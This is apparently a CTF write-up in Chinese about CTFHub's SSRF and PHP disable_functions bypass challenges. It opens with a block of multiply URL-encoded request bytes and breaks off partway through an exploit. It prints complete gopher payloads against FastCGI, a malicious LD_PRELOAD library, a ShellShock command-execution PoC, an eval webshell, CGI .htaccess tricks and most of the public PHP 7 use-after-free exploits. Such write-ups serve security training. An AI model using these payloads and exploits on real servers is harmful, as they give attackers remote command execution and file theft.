252566%252565%252572%252565%252572%25253a%252520%252568%252574%252574%252570%25253a%25252f%25252f%252531%252539%252532%25252e%252531%252536%252538%25252e%252531%252533%252539%25252e%252531%25252f%252575%252570%25256c%25256f%252561%252564%25255f%252573%252565%252572%25252e%252570%252568%252570%25250d%25250a%252541%252563%252563%252565%252570%252574%25252d%252545%25256e%252563%25256f%252564%252569%25256e%252567%25253a%252520%252567%25257a%252569%252570%25252c%252520%252564%252565%252566%25256c%252561%252574%252565%25250d%25250a%252541%252563%252563%252565%252570%252574%25252d%25254c%252561%25256e%252567%252575%252561%252567%252565%25253a%252520%25257a%252568%25252d%252543%25254e%25252c%25257a%252568%25253b%252571%25253d%252530%25252e%252539%25252c%252565%25256e%25253b%252571%25253d%252530%25252e%252538%25252c%252561%25256d%25253b%252571%25253d%252530%25252e%252537%25250d%25250a%252543%25256f%25256e%25256e%252565%252563%252574%252569%25256f%25256e%25253a%252520%252563%25256c%25256f%252573%252565%25250d%25250a%25250d%25250a%25252d%25252d%25252d%25252d%25252d%25252d%252557%252565%252562%25254b%252569%252574%252546%25256f%252572%25256d%252542%25256f%252575%25256e%252564%252561%252572%252579%252574%25254c%252574%252544%252566%252562%25256d%252536%252548%252578%252575%252578%252567%252576%252556%252578%25250d%25250a%252543%25256f%25256e%252574%252565%25256e%252574%25252d%252544%252569%252573%252570%25256f%252573%252569%252574%252569%25256f%25256e%25253a%252520%252566%25256f%252572%25256d%25252d%252564%252561%252574%252561%25253b%252520%25256e%252561%25256d%252565%25253d%252522%252550%252548%252550%25255f%252553%252545%252553%252553%252549%25254f%25254e%25255f%252555%252550%25254c%25254f%252541%252544%25255f%252550%252552%25254f%252547%252552%252545%252553%252553%252522%25250d%25250a%25250d%25250a%252531%252532%252533%25250d%25250a%25252d%25252d%25252d%25252d%25252d%25252d%252557%252565%252562%25254b%252569%252574%252546%25256f%252572%25256d%252542%25256f%252575%25256e%252564%252561%252572%252579%252574%25254c%252574%252544%252566%252562%25256d%252536%252548%252578%252575%252578%252567%252576%252556%252578%25250d%25250a%252543%25256f%25256e%252574%252565%25256e%252574%25252d%252544%252569%252573%252570%25256f%252573%252569%252574%252569%25256f%25256e%25253a%252520%252566%25256f%252572%25256d%25252d%252564%252561%252574%252561%25253b%252520%25256e%252561%25256d%252565%25253d%252522%252566%252569%25256c%252565%252522%25253b%252520%252566%252569%25256c%252565%25256e%252561%25256d%252565%25253d%252522%252531%252532%252533%25252e%252570%252568%252570%252522%25250d%25250a%252543%25256f%25256e%252574%252565%25256e%252574%25252d%252554%252579%252570%252565%25253a%252520%252561%252570%252570%25256c%252569%252563%252561%252574%252569%25256f%25256e%25252f%25256f%252563%252574%252565%252574%25252d%252573%252574%252572%252565%252561%25256d%25250d%25250a%25250d%25250a%25253c%25253f%252570%252568%252570%252520%252570%252568%252570%252569%25256e%252566%25256f%252528%252529%25253b%25253f%25253e%25250d%25250a%25252d%25252d%25252d%25252d%25252d%25252d%252557%252565%252562%25254b%252569%252574%252546%25256f%252572%25256d%252542%25256f%252575%25256e%252564%252561%252572%252579%252574%25254c%252574%252544%252566%252562%25256d%252536%252548%252578%252575%252578%252567%252576%252556%252578%25252d%25252d%25250d%25250a
```
![](https://img-blog.csdnimg.cn/20200928164602783.png#pic_center)

参考：[CTFHUB技能树-SSRF【持续更新】](https://blog.csdn.net/qq_33295410/article/details/108619685)
[CTFHub-SSRF部分（持续更新）](https://blog.csdn.net/rfrder/article/details/108589988)

### FastCGI协议
提示：这次.我们需要攻击一下fastcgi协议咯.也许附件的文章会对你有点帮助

`?url=file:///etc/passwd`
![](https://img-blog.csdnimg.cn/20201002164118803.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)首先验证存在ssrf，那么使用ssrf来攻击fpm，利用gopher协议攻击，使用神器[Gopherus](https://github.com/tarunkant/Gopherus)
`python gopherus.py --exploit fastcgi`
![](https://img-blog.csdnimg.cn/20201002164634462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
得到payload，进行url编码并传入，执行whoami
```php
?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%20%2F%20fcgiclient%20%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH58%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%20%253D%20On%250Adisable_functions%20%253D%20%250Aauto_prepend_file%20%253D%20php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%253A%2504%2500%3C%253Fphp%20system('whoami')%253Bdie('-----Made-by-SpyD3r-----%250A')%253B%253F%3E%2500%2500%2500%2500
```
![](https://img-blog.csdnimg.cn/20201002165250374.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
最后执行`cat /flag`，发现没有。。。。那么查看根目录`ls /`，得到flag名
```php
?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH56%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%25008%2504%2500%253C%253Fphp%2520system%2528%2527ls%2520%2F%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```
![](https://img-blog.csdnimg.cn/20201002165957139.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
最后cat即可
```php
?url=gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2504%2504%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%2500%2500%2500%2500%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_91ae5ed6072b4bdaaeb5160534730cb3%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500
```
![](https://img-blog.csdnimg.cn/20201002170246591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
参考文章：
[Fastcgi协议分析 && PHP-FPM未授权访问漏洞 && Exp编写](https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html)
[php-fpm(绕过open_basedir,结合ssrf)](https://www.cnblogs.com/zaqzzz/p/11870491.html)

### Redis协议
提示：这次来攻击redis协议吧.redis://127.0.0.1:6379,资料?没有资料!自己找!

不多废话，直接上gopherus，得到payload，记得进行url编码
![](https://img-blog.csdnimg.cn/20201002173137695.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
直接使用ssrf发现并未成功，看到返回头里有一个here is 302.php，懂了，用302来跳转
![](https://img-blog.csdnimg.cn/20201002174634753.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
最后得到shell.php，但发现给的是GET传参的webshell

![](https://img-blog.csdnimg.cn/20201002174803432.png#pic_center)发现过滤了`空格`，使用${IFS}即可绕过
![](https://img-blog.csdnimg.cn/2020100217573125.png#pic_center)
### URL Bypass

`url must start with "http://notfound.ctfhub.com"`
题目说明url前面必须有`http://notfound.ctfhub.com`，即要绕过检测

>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是`http://notfound.ctfhub.com`，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为`http://notfound.ctfhub.com`，而实际上这个URL所请求的内容都是127.0.0.1上的内容。

payload：`?url=http://notfound.ctfhub.com@127.0.0.1/flag.php`
![](https://img-blog.csdnimg.cn/20201003125426883.png#pic_center)
### 数字IP Bypass
首先尝试访问127.0.0.1，发现被过滤了127，172和@
![](https://img-blog.csdnimg.cn/20201003125629818.png#pic_center)

对于这种过滤我们可以采用改变IP的写法的方式进行绕过，例如127.0.0.1这个IP地址我们可以改写成：
1. 8进制格式：0177.00.00.01
2. 16进制格式：0x7f.0x0.0x0.0x1
3. 10进制整数格式：2130706433
4. 在linux下，0代表127.0.0.1，`http://0进行请求127.0.0.1`

![](https://img-blog.csdnimg.cn/20201003130239908.png#pic_center)
### 302跳转 Bypass
直接访问`?url=127.0.0.1/flag.php`
![](https://img-blog.csdnimg.cn/20201003133118668.png#pic_center)
这里依照题意写一下302跳转吧，这里一直在找短网址发现不行，所以还是在服务器上写上302.php
```php
<?php
header("Location:http://127.0.0.1/flag.php");
?>
```
![](https://img-blog.csdnimg.cn/20201003140550337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)然后再访问我们的服务器上的302.php即可实现跳转
![](https://img-blog.csdnimg.cn/20201003140656753.png#pic_center)
### DNS重绑定 Bypass
直接访问`?url=127.0.0.1/flag.php`，就出flag了。。。
![](https://img-blog.csdnimg.cn/20201003130604545.png#pic_center)
我们这里还是使用DNS重绑定，在网络上存在一个很神奇的服务，[http://xip.io](http://xip.io) 当我们访问这个网站的子域名的时候，例如127.0.0.1.xip.io，就会自动重定向到127.0.0.1。
即：`?url=127.0.0.1.xip.io/flag.php`
![](https://img-blog.csdnimg.cn/20201003130802496.png#pic_center)
参考：[SSRF漏洞中绕过IP限制的几种方法总结 ](https://www.freebuf.com/articles/web/135342.html)


## PHP
### Bypass disable_function
PHP 的 disabled_functions主要是用于禁用一些危险的函数防止被一些攻击者利用
有四种绕过 disable_functions 的手法：

1. 攻击后端组件，寻找存在命令注入的 web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞等等
2. 寻找未禁用的漏网函数，常见的执行命令的函数有 `system()、exec()、shell_exec()、passthru()`，偏僻的` popen()、proc_open()、pcntl_exec()`，逐一尝试，或许有漏网之鱼
3. mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制（让特定扩展名的文件直接和php-cgi通信）；
4. 利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。


参考：[无需sendmail：巧用LD_PRELOAD突破disable_functions](https://www.freebuf.com/articles/web/192052.html)

#### LD_PRELOAD
>LD_PRELOAD是Linux系统的一个环境变量，用于动态库的加载，动态库加载的优先级最高，它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的。

简单来说就是LD_PRELOAD指定的动态链接库文件，会在其它文件调用之前先被调用

**error_log(error,type,destination,headers)：**
当type为1时，服务器就会把error发送到参数 destination 设置的邮件地址

先生成一个hack.c恶意动态链接库文件
```c
#include <stdio.h>
#include <unistd.h>
#include <stdio.h>

__attribute__ ((__constructor__)) void angel (void){
    unsetenv("LD_PRELOAD");
    system("/readflag > /tmp/bmth");
}
```
使用gcc编译 `gcc -shared -fPIC hack.c -o hack.so`
![](https://img-blog.csdnimg.cn/20200429171842836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
虽然报错了，但还是生成了hack.so，上传到tmp文件夹下，再在www/html下创建bmth.php文件：
```php
<?php
	putenv("LD_PRELOAD=/tmp/hack.so");
	error_log("",1,"","");
?>
```
再去包含php文件`?ant=include('bmth.php');`，成功生成bmth
![](https://img-blog.csdnimg.cn/20200429173238993.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
![](https://img-blog.csdnimg.cn/20200429173318642.png)
本题mail函数无法使用，不然也可以使用`mail("","","","");`

参考：
[Bypass disabled_functions一些思路总结](https://xz.aliyun.com/t/4623)
[PHP中通过bypass disable functions执行系统命令的几种方式](https://www.freebuf.com/articles/web/169156.html)
#### ShellShock
题目描述：利用PHP破壳完成 Bypass
>**漏洞原理：**
目前的Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以“(){”开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。

首先连接蚁剑，发现执行不了函数
![](https://img-blog.csdnimg.cn/20200429185757968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
直接上传poc：
```php
<?php
function runcmd($c){
  $d = dirname($_SERVER["SCRIPT_FILENAME"]);
  if(substr($d, 0, 1) == "/" && function_exists('putenv') && (function_exists('error_log') || function_exists('mail'))){
    if(strstr(readlink("/bin/sh"), "bash")!=FALSE){
      $tmp=tempnam(sys_get_temp_dir(), 'as');
      putenv("PHP_LOL=() { x; }; $c >$tmp 2>&1");
      if (function_exists('error_log')) {
        error_log("a", 1);
      }else{
        mail("a@127.0.0.1", "", "", "-bv");
      }
    }else{
      print("Not vuln (not bash)\n");
    }
    $output = @file_get_contents($tmp);
    @unlink($tmp);
    if($output!=""){
      print($output);
    }else{
      print("No output, or not vuln.");
    }
  }else{
    print("不满足使用条件");
  }
}

// runcmd("whoami"); // 要执行的命令
runcmd($_REQUEST["cmd"]); // ?cmd=whoami
?>
```
通过putenv来设置环境变量，默认putenv定义的环境变量名必须以PHP_开头。error_log()函数会在执行sh -c -t -i触发payload

手工写入吧，首先创建a.php用来执行命令，test.php存放执行后的flag，使用tac读取flag，访问a.php：
```php
<?php
  @eval($_REQUEST['ant']);
  putenv("PHP_test=() { :; }; tac /flag >> /var/www/html/test.php");
  error_log("admin",1);
  //mail("admin@localhost","","","","");
?>
```
![](https://img-blog.csdnimg.cn/20201008212726136.png#pic_center)


参考：
[PHP < 5.6.2 - 'Shellshock' Safe Mode / disable_functions Bypass / Command Injection](https://www.exploit-db.com/exploits/35146)
[破壳漏洞(Shellshock)分析CVE-2014-6271](https://www.linuxidc.com/Linux/2014-10/108239.htm)
[破壳漏洞（CVE-2014-6271）综合分析：“破壳”漏洞系列分析之一](https://www.freebuf.com/news/48331.html)

#### Apache Mod CGI
>**CGI：**
CGI简单说来便是放在服务器上的可执行程序,CGI编程没有特定的语言,C语言,linux shell,perl,vb等等都可以进行CGI编程.
**MOD_CGI：**
任何具有MIME类型`application/x-httpd-cgi`或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中.

使用linux shell脚本编写的cgi程序便可以执行系统命令.
这个文件是 644 权限，`www-data` 用户无法通过读文件的形式读到内容, 需要执行拥有 SUID 权限的 tac 命令来获取 flag
.htaccess ：
```php
Options +ExecCGI
AddHandler cgi-script .ant
```
shell.ant
```bash
#!/bin/sh
echo&&cd "/var/www/html/backdoor";tac /flag;echo [S];pwd;echo [E]
```
![](https://img-blog.csdnimg.cn/20200429235134372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
访问却失败了，因为我们没有给刚才上传的shell.ant添加可执行权限
![](https://img-blog.csdnimg.cn/20200429235257331.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70)
添加权限`?ant=chmod('shell.ant',0777);`，不知道为什么还是执行不了，直接插件却可以执行。。。
![](https://img-blog.csdnimg.cn/20201008215807491.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

参考：[【PHP绕过】apache mod_cgi bypass disable_functions](https://blog.csdn.net/xia739635297/article/details/104764329)


#### PHP-FPM
>这里由于FPM默认监听的是9000端口,我们就可以绕过webserver,直接构造fastcgi协议，和fpm进行通信.于是就有了利用 webshell 直接与 FPM通信 来绕过 disable functions.
因为前面我们了解了协议原理和内容,接下来就是使用cgi协议封装请求,通过socket来直接与FPM通信
但是能够构造fastcgi，就能执行任意PHP代码吗?答案是肯定的,但是前提是我们需要突破几个限制：
1.第一个问题
既然是请求,那么`SCRIPT_FILENAME`就相当的重要,因为前面说过,fpm是根据这个值来执行php文件文件的,如果不存在,会直接返回404,所以想要利用好这个漏洞,就得找到一个已经存在的php文件,好在一般进行源安装php的时候,服务器都会附带上一些php文件,如果说我们没有收集到目标web目录的信息的话,可以试试这种办法.
2.第二个问题
我们再如何构造fastcgi和控制`SCRIPT_FILENAME`,都无法做到任意命令执行,因为只能执行目标服务器上的php文件.
那要如何绕过这种限制呢? 我们可以从`php.ini`入手.它有两个特殊选项,能够让我们去做到任意命令执行,那就是`auto_prepend_file`
`auto_prepend_file`的功能是在在执行目标文件之前，先包含它指定的文件,这样的话,就可以用它来指定php://input进行远程文件包含了.这样就可以做到任意命令执行了.
3.第三个问题
进行过远程文件包含的小伙伴都知道,远程文件包含有`allow_url_include`这个限制因素的,如果没有为ON的话就没有办法进行远程文件包含,那要怎末设置呢?
这里,FPM是有设置PHP配置项的KEY-VALUE的,`PHP_VALUE`可以用来设置php.ini,`PHP_ADMIN_VALUE`则可以设置所有选项.这样就解决问题了

直接执行蚁剑插件了，选择 PHP-FPM 的接口地址, 需要自行找配置文件查 FPM 接口地址, 默认的是`unix:///` 本地 socket 这种的,如果配置成 TCP 的默认是 `127.0.0.1:9000`
![](https://img-blog.csdnimg.cn/2020100822255538.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
成功后可以看到 `/var/www/html/` 目录下新建了一个 `.antproxy.php` 文件。我们创建副本, 并将连接的 URL shell 脚本名字改为 `.antproxy.php`, 就可以成功执行命令。
![](https://img-blog.csdnimg.cn/20201008222454425.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
![](https://img-blog.csdnimg.cn/20201008222934579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)

参考：
[利用Thinkphp RCE以及php-fpm绕过disable function拿下菠菜](https://www.anquanke.com/post/id/193117)
[AntSword 绕过 PHP disable_functions Part.05](https://www.bilibili.com/video/av59393944)

#### GC UAF
>注意 PHP 版本需要满足：
7.0 - all versions to date
7.1 - all versions to date
7.2 - all versions to date
7.3 - all versions to date

绕过脚本如下：
```php
<?php

# PHP 7.0-7.3 disable_functions bypass PoC (*nix only)
#
# Bug: https://bugs.php.net/bug.php?id=72530
#
# This exploit should work on all PHP 7.0-7.3 versions
#
# Author: https://github.com/mm0r1

pwn("uname -a");

function pwn($cmd) {
    global $abc, $helper;

    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = chr($v & 0xff);
            $v >>= 8;
        }
    }

    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }

    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);

        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }

        if(!$data_addr || !$text_size || !$data_size)
            return false;

        return [$data_addr, $text_size, $data_size];
    }

    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'constant' constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;

            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                # 'bin2hex' constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;

            return $data_addr + $i * 8;
        }
    }

    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }

    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);

            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }

    class ryat {
        var $ryat;
        var $chtg;
        
        function __destruct()
        {
            $this->chtg = $this->ryat;
            $this->ryat = 1;
        }
    }

    class Helper {
        public $a, $b, $c, $d;
    }

    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }

    $n_alloc = 10; # increase this value if you get segfaults

    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_repeat('A', 79);

    $poc = 'a:4:{i:0;i:1;i:1;a:1:{i:0;O:4:"ryat":2:{s:4:"ryat";R:3;s:4:"chtg";i:2;}}i:1;i:3;i:2;R:5;}';
    $out = unserialize($poc);
    gc_collect_cycles();

    $v = [];
    $v[0] = ptr2str(0, 79);
    unset($v);
    $abc = $out[2][0];

    $helper = new Helper;
    $helper->b = function ($x) { };

    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);

    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);

    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler

    ($helper->b)($cmd);

    exit();
}
```

![](https://img-blog.csdnimg.cn/20201009181917443.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2JtdGg2NjY=,size_16,color_FFFFFF,t_70#pic_center)
访问exploit.php即可得到flag

![](https://img-blog.csdnimg.cn/20201009182011926.png#pic_center)

参考：
[php7-gc-bypass](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)
[Bug #72530 	Use After Free in GC with Certain Destructors](https://bugs.php.net/bug.php?id=72530)

#### Json Serializer UAF
>php版本：
>7.1 - all versions to date
7.2 < 7.2.19 (released: 30 May 2019)
7.3 < 7.3.6 (released: 30 May 2019)

绕过脚本如下：
```php
<?php

$cmd = "id";

$n_alloc = 10; # increase this value if you get segfaults

class MySplFixedArray extends SplFixedArray {
    public static $leak;
}

class Z implements JsonSerializable {
    public function write(&$str, $p, $v, $n = 8) {
      $i = 0;
      for($i = 0; $i < $n; $i++) {
        $str[$p + $i] = chr($v & 0xff);
        $v >>= 8;
      }
    }

    public function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }

    public function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= chr($ptr & 0xff);
            $ptr >>= 8;
        }
        return $out;
    }

    # unable to leak ro segments
    public function leak1($addr) {
        global $spl1;

        $this->write($this->abc, 8, $addr - 0x10);
        return strlen(get_class($spl1));
    }

    # the real deal
    public function leak2($addr, $p = 0, $s = 8) {
        global $spl1, $fake_tbl_off;

        # fake reference zval
        $this->write($this->abc, $fake_tbl_off + 0x10, 0xdeadbeef); # gc_refcounted
        $this->write($this->abc, $fake_tbl_off + 0x18, $addr + $p - 0x10); # zval
        $this->write($this->abc, $fake_tbl_off + 0x20, 6); # type (string)

        $leak = strlen($spl1::$leak);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }

        return $leak;
    }

    public function parse_elf($base) {
        $e_type = $this->leak2($base, 0x10, 2);

        $e_phoff = $this->leak2($base, 0x20);
        $e_phentsize = $this->leak2($base, 0x36, 2);
        $e_phnum = $this->leak2($base, 0x38, 2);

        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = $this->leak2($header, 0, 4);
            $p_flags = $this->leak2($header, 4, 4);
            $p_vaddr = $this->leak2($header, 0x10);
            $p_memsz = $this->leak2($header, 0x28);

            if($p_type == 1 && $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
